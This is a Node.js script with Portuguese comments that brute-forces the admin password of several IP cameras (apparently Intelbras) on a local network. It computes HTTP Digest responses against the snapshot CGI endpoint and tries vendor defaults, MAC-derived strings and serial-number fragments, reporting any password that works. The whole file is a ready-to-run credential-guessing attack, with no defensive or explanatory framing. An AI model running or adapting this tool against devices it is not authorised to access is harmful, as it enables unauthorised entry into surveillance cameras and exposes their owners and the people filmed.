const http = require('http');
const crypto = require('crypto');

// MAC do realm: B9677ED752E7A6E6 → possíveis formatos
// Serial cam-1: FJ1M24007238M

function buildDigest(method, path, user, pass, realm, nonce, qop, opaque) {
  const nc = '00000001', cnonce = 'aya00001';
  const ha1 = crypto.createHash('md5').update(`${user}:${realm}:${pass}`).digest('hex');
  const ha2 = crypto.createHash('md5').update(`${method}:${path}`).digest('hex');
  const resp = qop
    ? crypto.createHash('md5').update(`${ha1}:${nonce}:${nc}:${cnonce}:${qop}:${ha2}`).digest('hex')
    : crypto.createHash('md5').update(`${ha1}:${nonce}:${ha2}`).digest('hex');
  let auth = `Digest username="${user}", realm="${realm}", nonce="${nonce}", uri="${path}", response="${resp}"`;
  if (qop) auth += `, qop=${qop}, nc=${nc}, cnonce="${cnonce}"`;
  if (opaque !== undefined) auth += `, opaque="${opaque}"`;
  return auth;
}

async function getChallenge(ip) {
  return new Promise((resolve) => {
    const req = http.request({ hostname: ip, port: 80, path: '/cgi-bin/snapshot.cgi?channel=1', method: 'GET', timeout: 5000 }, (res) => {
      const hdr = res.headers['www-authenticate'] || '';
      res.resume();
      const f = {};
      const re = /(\w+)="([^"]*)"/g; let m;
      while ((m = re.exec(hdr)) !== null) f[m[1]] = m[2];
      resolve(f);
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
    req.end();
  });
}

async function tryPass(ip, user, pass, realm, nonce, qop, opaque) {
  return new Promise((resolve) => {
    const path = '/cgi-bin/snapshot.cgi?channel=1';
    const auth = buildDigest('GET', path, user, pass, realm, nonce, qop, opaque);
    const req = http.request({
      hostname: ip, port: 80, path, method: 'GET', timeout: 4000,
      headers: { Authorization: auth },
    }, (res) => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, size: Buffer.concat(chunks).length }));
    });
    req.on('error', () => resolve({ status: 0 }));
    req.on('timeout', () => { req.destroy(); resolve({ status: 0 }); });
    req.end();
  });
}

const cameras = [
  { ip: '192.168.0.181', serial: 'FJ1M24007238M' },
  { ip: '192.168.0.108', serial: '' },
  { ip: '192.168.0.101', serial: '' },
];

// MAC do realm B9677ED752E7A6E6 → formatos possíveis
const macRaw = 'B9677ED752E7A6E6';
const macLow = macRaw.toLowerCase();

const extraPasswords = [
  macRaw, macLow,
  macRaw.slice(-8), macLow.slice(-8),
  macRaw.slice(-6), macLow.slice(-6),
  '7238M', '24007238', 'FJ1M24007238M', // partes do serial
  'Intelbras@2024', 'Intelbras@2025', 'Intelbras@2026',
  '1234', '0000', 'password',
];

(async () => {
  for (const cam of cameras) {
    console.log(`\n=== ${cam.ip} ===`);
    const c = await getChallenge(cam.ip);
    if (!c || !c.realm) { console.log('  sem challenge (câmera não responde)'); continue; }
    console.log(`  realm: ${c.realm}`);

    const passwords = ['', 'admin', '123456', '888888', '666666', ...extraPasswords];
    if (cam.serial) passwords.push(cam.serial, cam.serial.slice(-6), cam.serial.slice(-4));

    for (const pass of passwords) {
      const r = await tryPass(cam.ip, 'admin', pass, c.realm, c.nonce, c.qop, c.opaque);
      if (r.status === 200 && r.size > 100) {
        console.log(`  ✅ SENHA ENCONTRADA: admin:${pass || '(blank)'}`);
        break;
      }
    }
  }
  console.log('\nConcluído.');
})();
